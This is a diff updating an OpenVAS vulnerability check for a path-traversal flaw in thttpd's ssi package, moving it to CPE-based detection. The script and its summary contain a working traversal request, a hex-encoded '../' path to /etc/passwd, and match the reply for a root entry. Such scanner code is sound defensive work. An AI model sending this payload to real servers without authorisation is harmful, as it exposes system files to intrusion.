@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: thttpd_ssi.nasl 6040 2017-04-27 09:02:38Z teissa $
+# $Id: thttpd_ssi.nasl 8929 2018-02-23 05:05:21Z ckuersteiner $
 #
 # thttpd ssi file retrieval
 #
@@ -24,11 +24,13 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
+CPE = "cpe:/a:acme:thttpd";
+
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.10523");
-  script_version("$Revision: 6040 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-04-27 11:02:38 +0200 (Thu, 27 Apr 2017) $");
+  script_version("$Revision: 8929 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-02-23 06:05:21 +0100 (Fri, 23 Feb 2018) $");
   script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
   script_bugtraq_id(1737);
   script_tag(name:"cvss_base", value:"7.5");
@@ -38,23 +40,18 @@ if(description)
   script_category(ACT_ATTACK);
   script_copyright("This script is Copyright (C) 2000 Thomas Reinke");
   script_family("Remote file access");
-  script_dependencies("find_service.nasl", "http_version.nasl");
-  script_require_ports("Services/www", 80);
-  script_exclude_keys("Settings/disable_cgi_scanning");
+  script_dependencies("gb_thttpd_detect.nasl");
+  script_mandatory_keys("thttpd/installed");
 
-  tag_summary = "The remote HTTP server allows an attacker to read arbitrary files
-  on the remote web server, by employing a weakness in an included ssi package, by
-  prepending pathnames with %2e%2e/ (hex-encoded ../) to the pathname.
+  script_tag(name: "solution", value: "Upgrade to version 2.20 of thttpd.");
 
-  Example:
-    GET /cgi-bin/ssi//%2e%2e/%2e%2e/etc/passwd
+  script_tag(name: "summary", value: "The remote HTTP server allows an attacker to read arbitrary files on the
+remote web server, by employing a weakness in an included ssi package, by prepending pathnames with %2e%2e/
+(hex-encoded ../) to the pathname.
 
-  will return /etc/passwd.";
+Example:   GET /cgi-bin/ssi//%2e%2e/%2e%2e/etc/passwd
 
-  tag_solution = "Upgrade to version 2.20 of thttpd.";
-
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+will return /etc/passwd.");
 
   script_tag(name:"solution_type", value:"VendorFix");
   script_tag(name:"qod_type", value:"remote_vul");
@@ -62,21 +59,25 @@ if(description)
   exit(0);
 }
 
+include("host_details.inc");
 include("http_func.inc");
 include("http_keepalive.inc");
 
-port = get_http_port( default:80 );
+if (!port = get_app_port(cpe: CPE))
+  exit(0);
 
-foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
+if (!dir = get_app_location(cpe: CPE, port: port))
+  exit(0);
 
-  if( dir == "/" ) dir = "";
-  url = string( dir, "/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" );
+if (dir == "/")
+  dir = "";
 
-  if( http_vuln_check( port:port, url:url, pattern:".*root:.*:0:[01]:.*" ) ) {
-    report = report_vuln_url( port:port, url:url );
-    security_message( port:port, data:report );
-    exit( 0 );
-  }
+url = dir + "/ssi//%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd";
+
+if (http_vuln_check(port: port, url: url, pattern: ".*root:.*:0:[01]:.*", check_header: TRUE)) {
+  report = report_vuln_url(port: port, url: url);
+  security_message(port: port, data: report);
+  exit(0);
 }
 
-exit( 99 );
+exit(99);
